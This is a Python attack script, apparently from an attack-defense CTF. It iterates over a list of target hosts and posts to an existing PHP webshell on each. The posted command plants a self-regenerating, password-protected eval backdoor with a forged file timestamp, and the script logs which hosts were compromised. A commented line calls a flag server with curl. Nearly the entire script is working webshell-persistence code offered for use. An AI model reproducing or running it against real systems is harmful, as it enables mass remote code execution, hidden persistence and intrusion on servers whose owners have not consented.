from os import system
import requests
import re
import json

# ip列表
ip = []
# 一句话木马的位置
payload = '/ma1.php' 
data = {}
error = []
com = re.compile(r'[0-9A-Fa-f]{32}')
f = open('/Users/h3zh1/Desktop/web.txt') # ip:port的列表
lines = f.readlines()
for i in lines:
	#
	ip.append(i.rstrip())

num = 0
for i in ip:
	datas={}
	try:
		
		#datas['xiaoma'] = 'system("curl http://10.1.8.26/remoteflag/");'
		# 批量在当前目录生成POST不死马
		# 使用方法 url/.index1.php post:pass=hbu&a=system("curl http://10.1.8.26/remoteflag/");
		datas['cmd'] = "system('while true;do echo \\'<?php if(md5($_POST[pass])==\"ec34e3ddb39fa86abf919bd677795429\"){@eval($_POST[a]);} ?>\\' >.index1.php;touch -m -d \"2017-11-17 10:21:26\" .index1.php;sleep 5;done;');"
		#注意这是post的一句话,
		r = requests.post('http://'+i+payload,timeout=1.0,data=datas)
		#如果是get方法的话把下一句解开注释
		#r = requests.get('http://'+i+payload,timeout=1.0,params=datas)
		r.encoding = r.apparent_encoding
		#print(datas['cmd'])
		
		if r.status_code!=404 and r.text!='':
			#print('http://'+i+payload)
			num += 1
			print(r.text)
	except:
		print(i+'发生异常')
		error.append(i)

#下边没咋改,不知道怎么调了,可以打成功
flag = ''
for i,j in data.items():
    	flag += i+' '+j+'\n'
with open('flag_post.txt','w') as f:
	f.write(flag)
print('以下目标出现异常')
for i in error:
	print(i)
print('本次'+str(num)+'个目标攻击成功!')
for i,j in data.items():
    	print(i,j)
